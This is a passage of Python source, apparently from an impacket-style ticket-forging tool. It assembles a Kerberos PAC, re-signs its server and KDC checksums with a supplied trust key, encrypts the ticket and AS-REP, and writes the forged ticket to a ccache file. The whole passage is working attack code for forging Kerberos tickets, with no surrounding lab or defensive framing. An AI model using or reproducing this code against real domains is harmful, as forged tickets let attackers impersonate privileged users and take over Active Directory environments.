        pac_blobs_with_padding: list[tuple[int, bytes, bytes]] = []
        for buffer_type in pac_buffer_order:
            buffer_bytes = pac_infos[buffer_type]
            pac_blobs_with_padding.append((buffer_type, buffer_bytes, zero_pad(len(buffer_bytes))))

        buffer_count = len(pac_buffer_order)
        pac_info_buffer_header_size = len(PAC_INFO_BUFFER().getData())
        current_data_offset = 8 + pac_info_buffer_header_size * buffer_count

        def make_info_buffer(ul_type: int, blob_length: int) -> PAC_INFO_BUFFER:
            nonlocal current_data_offset
            info_buffer = PAC_INFO_BUFFER()
            info_buffer["ulType"] = ul_type
            info_buffer["cbBufferSize"] = blob_length
            info_buffer["Offset"] = current_data_offset
            current_data_offset = self._getBlockLength(current_data_offset + blob_length)
            return info_buffer

        info_buffers: list[PAC_INFO_BUFFER] = []
        for buffer_type, buffer_bytes, _ in pac_blobs_with_padding:
            info_buffers.append(make_info_buffer(buffer_type, len(buffer_bytes)))

        buffers_header_bytes = b"".join(info_buffer.getData() for info_buffer in info_buffers)
        buffers_data_bytes = b"".join(buffer_bytes + padding for _, buffer_bytes, padding in pac_blobs_with_padding)

        pac_type = PACTYPE()
        pac_type["cBuffers"] = buffer_count
        pac_type["Version"] = 0
        pac_type["Buffers"] = buffers_header_bytes + buffers_data_bytes
        pac_bytes_for_checksum = pac_type.getData()

        server_checksum_struct = PAC_SIGNATURE_DATA(pac_infos[PAC_SERVER_CHECKSUM])
        kdc_checksum_struct = PAC_SIGNATURE_DATA(pac_infos[PAC_PRIVSVR_CHECKSUM])

        checksum_function_server = _checksum_table[server_checksum_struct["SignatureType"]]
        checksum_function_kdc = _checksum_table[kdc_checksum_struct["SignatureType"]]

        server_checksum_struct["Signature"] = checksum_function_server.checksum(trust_key, KERB_NON_KERB_CKSUM_SALT, pac_bytes_for_checksum)
        kdc_checksum_struct["Signature"] = checksum_function_kdc.checksum(trust_key, KERB_NON_KERB_CKSUM_SALT, server_checksum_struct["Signature"])

        rebuilt_blobs: list[bytes] = []
        for buffer_type, buffer_bytes, padding in pac_blobs_with_padding:
            if buffer_type == PAC_SERVER_CHECKSUM:
                buffer_bytes = server_checksum_struct.getData()
            elif buffer_type == PAC_PRIVSVR_CHECKSUM:
                buffer_bytes = kdc_checksum_struct.getData()
            rebuilt_blobs.append(buffer_bytes + padding)
        pac_type["Buffers"] = buffers_header_bytes + b"".join(rebuilt_blobs)

        authorization_data = AuthorizationData()
        authorization_data[0] = noValue
        authorization_data[0]["ad-type"] = AuthorizationDataType.AD_WIN2K_PAC.value
        authorization_data[0]["ad-data"] = pac_type.getData()
        enc_ticket_part["authorization-data"][0]["ad-data"] = encoder.encode(authorization_data)

        ticket_cipher = _enctype_table[enctype_value]
        enc_ticket_part_bytes = encoder.encode(enc_ticket_part)
        encrypted_ticket_ciphertext = ticket_cipher.encrypt(trust_key, 2, enc_ticket_part_bytes, None)
        as_rep["ticket"]["enc-part"]["cipher"] = encrypted_ticket_ciphertext
        as_rep["ticket"]["enc-part"]["kvno"] = 2

        enc_asrep_part_bytes = encoder.encode(enc_asrep_part)
        client_session_key = Key(ticket_cipher.enctype, enc_asrep_part["key"]["keyvalue"].asOctets())
        encrypted_encpart_ciphertext = ticket_cipher.encrypt(client_session_key, 3, enc_asrep_part_bytes, None)
        as_rep["enc-part"]["cipher"] = encrypted_encpart_ciphertext
        as_rep["enc-part"]["etype"] = ticket_cipher.enctype
        as_rep["enc-part"]["kvno"] = 1

        return encoder.encode(as_rep), client_session_key

    def _saveTicket(self, filename: str, encoded_asrep: bytes, client_session_key: Key) -> str:
        ccache = CCache()
        ccache.fromTGT(encoded_asrep, client_session_key, client_session_key)
        ccache.saveFile(filename)
        return filename
